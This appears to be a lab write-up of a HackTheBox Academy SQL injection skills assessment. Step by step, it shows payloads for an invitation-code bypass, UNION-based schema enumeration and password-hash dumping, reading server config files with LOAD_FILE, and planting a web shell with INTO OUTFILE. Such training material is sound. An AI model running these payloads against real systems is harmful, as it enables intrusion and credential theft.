# Skills Assessment — SQL Injection Fundamentals Writeup

> **Date:** August 1, 2026  
> **Platform:** HackTheBox Academy / CPTS  
> **Category:** Web Application Security  
> **Tags:** `Web` `HTB` `CPTS` `SQL Injection`

---

![CPTS SQLi Banner](assets/images/sqli-10.png)

## Overview

This writeup covers the **Skills Assessment** for the **SQL Injection Fundamentals** module on HackTheBox Academy (part of the Certified Penetration Tester — CPTS track). 

The target application contains an endpoint susceptible to SQL Injection vulnerabilities allowing authentication bypass, UNION-based data extraction, and local file retrieval/out-of-band execution.

---

## 1. Initial Reconnaissance & Enumeration

I first tested the **login form** for SQL injection using several authentication bypass payloads, but none of them appeared to be vulnerable.

Since authentication wasn’t possible, I moved on to the **registration page**.

While attempting to register an account, the application required an invitation code.

- Intercepted the registration request using **Burp Suite** after entering random characters in the invitation code.

![Target Web Application](assets/images/sqli-1.png)

- After testing several SQL injection payloads, I found that the `invitationCode` parameter was vulnerable and I bypassed it using this payload:

```sql
' OR '1'='1
' OR 1=1 -- -
" OR "1"="1
```

Now We have an account !!

![Target Web Application](assets/images/sqli-2.png)

---

## 2. Determining Column Count & Database Layout

After logging in, I reached the chat application.

The application contained:
- A search bar
- A message box
- A list of conversations

![ORDER BY Injection Test](assets/images/sqli-3.png)

The vulnerable endpoint was the **search field**.

- **Column Enumeration:** Determined the number of columns using `UNION SELECT`:

```sql
admin') UNION SELECT 1, 2, 3, 4-- -
```

![Reflective Columns Found](assets/images/sqli-4.png)

Observation: Columns 3 and 4 reflected output back onto the page layout.

---

## 3. Enumerating Database Name, Version & Tables

Using the UNION vulnerability on columns 3 and 4, the database schema was dumped.

### 1. Enumerating Databases

```sql
admin') UNION SELECT 1,2,schema_name,4 
FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

Found: `information_schema`, `chattr`

### 2. Enumerating Tables in chattr

```sql
admin') UNION SELECT 1,2,TABLE_NAME,TABLE_SCHEMA 
FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA ='chattr'-- -
```
**Found Tables:** `Users`, `InvitationCodes`, `Messages`

### 3. Enumerating Columns in Users

```sql
admin') UNION SELECT 1,2,COLUMN_NAME,TABLE_NAME 
FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME ='Users'-- -
```
**Found Columns:** `UserID`, `Username`, `Password`, `InvitationCode`, `AccountCreated`

### 4. Dumping User Credentials

```sql
admin') UNION SELECT 1,2,Username,Password FROM chattr.Users;-- -
```
**Extracted Hashes:** Retrieved password hashes for users including `admin`, `bmdyy`, and `dev` (stored as argon2 hashes).

![Database Version & Name Dump](assets/images/sqli-5.png)

---

## 4. File Operations — The Web Root Path

To determine what permissions the database user had, I first identified the current user:

```sql
admin') UNION SELECT 1,2,CURRENT_USER(),4-- -
```

**Output:**

```text
chattr_dbUser@localhost
```

Next, I enumerated the granted privileges:

```sql
admin') UNION
SELECT 1,2,grantee,privilege_type
FROM information_schema.user_privileges-- -
```

![Database User Privileges](assets/images/sqli-6.png)

The database user possessed the **FILE** privilege.

This is particularly interesting because it allows reading and writing files on the server using `LOAD_FILE()` and `INTO OUTFILE`.

I first retrieved the Nginx configuration:

```sql
admin') UNION
SELECT 1,2,LOAD_FILE('/etc/nginx/nginx.conf'),4-- -
```

The configuration revealed that virtual host configurations were loaded from:

```text
/etc/nginx/sites-enabled/*
```

![Nginx Config](assets/images/sqli-7.png)

I then read the default virtual host configuration:

```sql
admin') UNION
SELECT 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default'),4-- -
```

![Virtual Host Config](assets/images/sqli-8.png)

From this file I discovered the web root:

```text
/var/www/chattr-prod
```

---

## 5. Remote Code Execution (RCE) — The Flag

- **Verifying File Write Access:** Before attempting code execution, I verified that the database user could create files inside the web root:

```sql
admin') UNION 
SELECT "","","file written successfully!","" 
INTO OUTFILE '/var/www/chattr-prod/proof.txt'-- -
```

And it worked!

- **Writing a Web Shell:** Leveraging the MySQL `INTO OUTFILE` capability and the `FILE` privilege, a web shell script was written directly into the web root:

```sql
admin') UNION SELECT "", "", "[PHP_EXEC_PAYLOAD]", "" 
INTO OUTFILE '/var/www/chattr-prod/cmd.php';-- -
```

- **Executing Commands & Capturing the Flag:**
Navigated to the newly created shell and ran searches to locate flags:

```bash
find / -name "*.txt" 2>/dev/null
```
**FOUND THE FLAG IN:** `/flag_876a4c.txt`

![Flag Captured](assets/images/sqli-9.png)
